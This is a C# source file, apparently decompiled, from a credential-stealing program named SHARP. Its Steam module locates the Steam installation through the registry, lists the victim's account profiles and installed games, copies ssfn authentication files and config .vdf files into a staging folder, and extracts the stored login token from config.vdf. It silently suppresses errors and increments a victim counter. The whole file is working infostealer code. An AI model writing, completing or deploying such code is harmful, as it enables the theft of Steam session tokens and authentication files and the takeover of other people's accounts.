using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SHARP
{
    internal class Steam
    {
      private static readonly string SteamPath_x64 = "SOFTWARE\\Wow6432Node\\Valve\\Steam";
      public static readonly string SteamPath_x32 = "Software\\Valve\\Steam";
      private static readonly bool True = true;
      private static readonly bool False = false;
      private static readonly string LoginFile = Path.Combine(Steam.GetLocationSteam(), "config\\loginusers.vdf");

      public static async Task SteamGet(string head)
      {
        try
        {
          string path = head + "\\Steam";
          RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey(Steam.SteamPath_x32);
          string str1 = registryKey1.GetValue("SteamPath").ToString();
          if (!Directory.Exists(str1) || Steam.GetLocationSteam() == null || Steam.GetAllProfiles() == null)
            return;
          Directory.CreateDirectory(path);
          foreach (string allProfile in Steam.GetAllProfiles())
            File.AppendAllText(path + "\\AccountsList.txt", allProfile);
          foreach (string subKeyName in registryKey1.OpenSubKey("Apps").GetSubKeyNames())
          {
            using (RegistryKey registryKey2 = registryKey1.OpenSubKey("Apps\\" + subKeyName))
            {
              string str2 = (string) registryKey2.GetValue("Name");
              string str3 = string.IsNullOrEmpty(str2) ? "Unknown" : str2;
              File.AppendAllText(path + "\\Games.txt", str3 + "\n");
            }
          }
          if (Directory.Exists(str1))
          {
            Directory.CreateDirectory(path + "\\ssnf");
            foreach (string file in Directory.GetFiles(str1))
            {
              if (file.Contains("ssfn"))
                File.Copy(file, $"{path}\\ssnf\\{Path.GetFileName(file)}");
            }
          }
          string str4 = Path.Combine(str1, "config");
          if (Directory.Exists(str4))
          {
            Steam.GetToken(str4);
            Directory.CreateDirectory(path + "\\configs");
            foreach (string file in Directory.GetFiles(str4))
            {
              if (file.EndsWith("vdf"))
                File.Copy(file, $"{path}\\configs\\{Path.GetFileName(file)}");
            }
          }
          ++Counting.Steam;
        }
        catch
        {
        }
      }

      public static string GetLocationSteam(string Inst = "InstallPath", string Source = "SourceModInstallPath")
      {
        try
        {
          using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
          {
            using (RegistryKey registryKey2 = registryKey1.OpenSubKey(Steam.SteamPath_x64, Environment.Is64BitOperatingSystem ? Steam.True : Steam.False))
            {
              using (RegistryKey registryKey3 = registryKey1.OpenSubKey(Steam.SteamPath_x32, Environment.Is64BitOperatingSystem ? Steam.True : Steam.False))
                return registryKey2?.GetValue(Inst)?.ToString() ?? registryKey3?.GetValue(Source)?.ToString();
            }
          }
        }
        catch
        {
          return (string) null;
        }
      }

      public static List<string> GetAllProfiles()
      {
        try
        {
          if (!File.Exists(Steam.LoginFile))
            return (List<string>) null;
          List<string> list = Regex.Matches(File.ReadAllText(Steam.LoginFile), "\\\"76(.*?)\\\"").Cast<Match>().Select<Match, string>((Func<Match, string>) (x => "76" + x.Groups[1].Value)).ToList<string>();
          List<string> allProfiles = new List<string>();
          for (int index = 0; index < list.Count<string>(); ++index)
            allProfiles.Add($"https://steamcommunity.com/profiles/{list[index]}\n");
          return allProfiles;
        }
        catch
        {
          return (List<string>) null;
        }
      }

      public static void GetToken(string configpath)
      {
        string path1 = Path.Combine(configpath, "config.vdf");
        string path2 = Path.Combine(Help.ExploitDir, nameof (Steam), "Token.txt");
        if (!File.Exists(path1))
          return;
        foreach (string readAllLine in File.ReadAllLines(path1))
        {
          if (readAllLine.Contains("eyAidHlw"))
          {
            string str = ((IEnumerable<string>) readAllLine.Replace('\t', '\n').Split('\n')).Last<string>().Replace('"', ' ').Trim();
            File.WriteAllText(path2, "Token: " + str);
            break;
          }
        }
      }
    }
}
